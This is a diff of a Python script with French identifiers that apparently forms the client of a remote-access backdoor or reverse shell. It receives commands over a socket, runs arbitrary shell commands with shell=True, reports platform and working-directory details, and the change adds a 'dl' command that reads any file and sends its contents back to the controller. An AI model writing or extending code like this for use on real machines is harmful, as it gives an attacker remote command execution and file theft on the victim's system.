@@ -30,27 +30,33 @@ while True:
     commande_split = commande.split(" ")
 
     if commande == "infos":
-        reponse = platform.platform() + "|" + os.getcwd() + "\n"
+        reponse_encodee = (platform.platform() + "|" + os.getcwd() + "\n").encode()
+
     elif len(commande_split) == 2 and commande_split[0] == "cd":
         try:
             os.chdir(commande_split[1].strip("'"))
-            reponse = f"Répertoire changé : {os.getcwd()}\n"
+            reponse_encodee = f"Répertoire changé : {os.getcwd()}\n".encode()
         except FileNotFoundError:
-            reponse = "ERREUR : ce répertoire n'existe pas\n"
+            reponse_encodee = "ERREUR : ce répertoire n'existe pas\n".encode()
+
+    elif len(commande_split) == 2 and commande_split[0] == "dl":
+        try:
+            with open(commande_split[1], "rb") as f:
+                reponse_encodee = f.read()
+        except FileNotFoundError:
+            reponse_encodee = "ERREUR : fichier non trouvé\n".encode()
+
     else:
         resultat = subprocess.run(commande, shell=True, capture_output=True,
             universal_newlines=True)
         reponse = resultat.stdout + resultat.stderr
+        if not reponse:
+            reponse = "Aucune sortie pour cette commande\n"
+        reponse_encodee = reponse.encode()
 
-    if not reponse:
-        reponse = "Aucune sortie pour cette commande\n"
-
-    data_len = len(reponse.encode())
-    reponse_encodee = reponse.encode()
     header = str(len(reponse_encodee)).zfill(13)
     print("header:", header)
     s.sendall(header.encode())
-    if data_len > 0:
-        s.sendall(reponse_encodee)
+    s.sendall(reponse_encodee)
 
 s.close()
